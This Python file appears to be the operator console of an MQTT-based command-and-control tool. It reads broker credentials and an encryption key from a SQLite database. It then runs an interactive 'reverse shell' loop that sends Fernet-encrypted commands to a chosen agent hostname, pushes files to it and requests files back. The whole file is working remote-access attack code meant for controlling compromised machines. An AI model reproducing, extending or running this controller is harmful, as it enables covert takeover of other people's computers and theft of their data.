import paho.mqtt.client as mqtt
from cryptography.fernet import Fernet
from collections import namedtuple
import sqlite3
import base64
import threading
import subprocess
import time
import worker
import os

dbfile = (os.path.dirname(os.path.realpath(__file__))+"/mqt-config.db")

def Output():
	worker.Main()

timeout = 1
AL = namedtuple('AL', 'Transport Address Port User Pass Key')
conn = sqlite3.connect(dbfile)
conn.isolation_level = None
conn.row_factory = lambda cursor, row: AL(*row)
cursor = conn.cursor()
for row in cursor.execute("SELECT Transport, Address, Port, User, Pass, Key from listener WHERE Active = 'yes'"):
	atrans=str(row.Transport)
	broker=str(row.Address)
	port=int(row.Port)
	username=str(row.User)
	password=str(row.Pass)
	key=bytes(row.Key)
conn.close()
cipher = Fernet(key)
t1 = threading.Thread(target=Output, args=[])
t1.daemon = True
t1.start()

# Set a topic for target to listen
agent = ""
topic_cmd = "target/"+agent+"/"
topic_ul_fn = topic_cmd+"ul/"
topic_ul = "output/"+agent+"/ul/"
topic_dl_fn=  "target/"+agent+"/dl/"
topic_dl = "target/+/dl/"
# Set up connection
client = mqtt.Client(transport=atrans)
client.tls_set()
client.username_pw_set(username, password)
client.connect(broker, port, 60)

time.sleep(0.5)
client.loop_start()

def choices1():
	print('\nEnter Hostname for reverse shell, enter exit to leave')
	agent = input('Agent Hostname: ')
	print('Enter a command')

	while True:
		command = "\r\n"
		command = input()
		if command == 'exit':
			client.loop_stop()
			client.disconnect()
			print("\nGoodbye\n")
			quit()
		elif command == 'back':
			os.system('clear')
			choices1()
		elif command == 'upload':
			fninput = input('Name of file to upload: ')
			fn = fninput.rsplit('/', 1)[-1]
			fn1 = bytes(fn, 'utf-8')
			fn2 = cipher.encrypt(fn1)
			fn3 = fn2.decode()
			client.publish("target/"+agent+"/ul/",payload=fn3)
			file = open(fninput, mode='rb')
			fileContent = file.read()
			fc = cipher.encrypt(fileContent)
			fc2 = fc.decode()
			client.publish("target/"+agent+"/ulf/",payload=fc2)
			print(fn+' was uploaded.')
		elif command == 'download':
			fninput2 = input('Name of file to download: ')
			global dlfilename
			dlfilename = fninput2.rsplit('/', 1)[-1]
			f1 = bytes(fninput2, 'utf-8')
			f2 = cipher.encrypt(f1)
			f3 = f2.decode()
			client.publish("target/"+agent+"/dln/",payload=f3)
			print('Download request sent')
		else:
			command2 = bytes(command, 'utf-8')
			encrypted_message2 = cipher.encrypt(command2)
			command3 = encrypted_message2.decode()
			client.publish("target/"+agent+"/",payload=command3)
choices1()
